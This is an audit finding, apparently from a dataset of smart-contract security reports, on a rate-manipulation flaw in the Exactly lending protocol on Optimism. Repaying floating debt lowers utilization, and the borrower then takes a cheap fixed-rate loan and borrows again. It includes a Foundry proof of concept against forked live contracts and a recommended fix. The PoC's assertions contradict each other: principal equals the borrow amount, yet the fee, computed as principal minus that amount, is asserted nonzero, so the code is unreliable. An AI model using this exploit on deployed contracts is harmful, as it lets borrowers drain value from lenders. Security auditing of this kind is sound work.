# [M] Fixed interest rates can be manipulated by a borrower repaying loans to access a lower rate, and borrowing the loan previously repaid again

## Summary
Severity: Medium
Contest weight: 0.6484
Dataset id: 22779
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
To calculate the utilization of the market, we use the average of the total assets, this is to prevent the manipulation of the rate by depositing and withdrawing in the same block. However, the floating debt used to calculate the utilization is not an average, but just the current value. This will allow an attacker to manipulate the rate by repaying loans to access a lower rate, and borrowing the loan previously repaid again.
```solidity
uint256 memFloatingAssetsAverage = previewFloatingAssetsAverage();
uint256 memFloatingDebt = floatingDebt;
maturity,
maxFuturePools,
floatingUtilization(memFloatingAssetsAverage, memFloatingDebt),
globalUtilization(memFloatingAssetsAverage, memFloatingDebt,
floatingBackupBorrowed)
);
```

## Proof of Concept
The following PoC executes this attack on the live contracts of Exactly on the Optimism chain. The test can be pasted into a new file within a forge environment. Also, the .env file must include the variable OPTIMISM_RPC_URL for the test to run. The test can be executed with the following command:
forge test --match-test test_manipulate_utilization_lower_rate --evm-version cancun
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import {Market} from "protocol/contracts/Market.sol";
import {Test} from "forge-std/Test.sol";
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
contract TestManipulationRate is Test {
    Market marketUSDC = Market(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    Market marketWSTETH = Market(0x22ab31Cd55130435b5efBf9224b6a9d5EC36533F);
    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IERC20 wsteth = IERC20(0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb);
    uint256 public optimismFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        optimismFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(optimismFork, vm.activeFork());
    }

    function test_manipulate_utilization_lower_rate() public {
        vm.rollFork(119348257); // Abr 28
        uint256 maturity = 1729728000; // Latest maturity
        uint256 liquidity = 3e18;
        uint256 borrowAmount = 1e18;

        // Simulate that a whale has borrowed a lot from the wstETH market
        address whale = makeAddr("whale");
        vm.startPrank(whale);
        deal(address(usdc), whale, 5_000_000e6);
        usdc.approve(address(marketUSDC), type(uint256).max);
        marketUSDC.deposit(5_000_000e6, whale);
        marketUSDC.auditor().enterMarket(marketUSDC);
        for (uint i = 0; i < 35; i++) {
            marketWSTETH.borrow(20e18, whale, whale);
        }
        vm.stopPrank();

        uint256 snapshot = vm.snapshot();
        deal(address(wsteth), address(this), liquidity);
        wsteth.approve(address(marketWSTETH), liquidity);
        marketWSTETH.deposit(liquidity, address(this));
        marketWSTETH.auditor().enterMarket(marketWSTETH);
        marketWSTETH.borrowAtMaturity(
            maturity,
            borrowAmount,
            type(uint256).max,
            address(this),
            address(this)
        );
        uint256 principal1 = marketWSTETH.previewBorrowAtMaturity(maturity, borrowAmount);
        uint256 fee1 = principal1 - borrowAmount;

        // Reverse the borrow and decrease utilization first
        vm.revertTo(snapshot);
        vm.startPrank(whale);
        wsteth.approve(address(marketWSTETH), type(uint256).max);
        marketWSTETH.repay(700e18, whale);
        vm.stopPrank();

        deal(address(wsteth), address(this), liquidity);
        wsteth.approve(address(marketWSTETH), liquidity);
        marketWSTETH.deposit(liquidity, address(this));
        marketWSTETH.auditor().enterMarket(marketWSTETH);
        marketWSTETH.borrowAtMaturity(
            maturity,
            borrowAmount,
            type(uint256).max,
            address(this),
            address(this)
        );
        uint256 principal2 = marketWSTETH.previewBorrowAtMaturity(maturity, borrowAmount);
        uint256 fee2 = principal2 - borrowAmount;

        // With the original utilization, the fee is higher
        assertEq(principal1, borrowAmount);
        assertEq(fee1, 0.582518181735455386e18); // The fee is ~58% of the borrow amount

        // After the utilization is manipulated, the fee is a LOT lower
        assertEq(principal2, borrowAmount);
        assertEq(fee2, 0.011389232448094875e18); // The fee is ~1% of the borrow amount
    }
}
```

## Recommendation
To mitigate this issue is recommended to use an average of the floating debt to calculate the utilization. This way, using the same mechanism the average of the total assets is calculated will prevent this attack from happening.
